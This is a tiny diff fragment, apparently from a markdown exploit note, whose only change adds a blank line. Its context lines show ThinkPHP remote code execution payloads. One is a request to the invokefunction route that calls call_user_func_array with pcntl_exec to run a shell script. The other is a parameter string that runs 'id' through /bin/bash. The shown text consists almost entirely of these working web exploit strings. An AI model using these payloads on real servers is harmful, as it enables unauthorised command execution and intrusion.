@@ -31,6 +31,7 @@ if(function_exists('pcntl_exec')) {
 
 cmd[0]=/bin/bash&cmd[1][0]=-c&cmd[1][1]=id > /tmp/xxx.txt
 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=pcntl_exec&vars[1][0]=/bin/bash&vars[1][1][0]=/tmp/1.sh
+
 ```
 
 
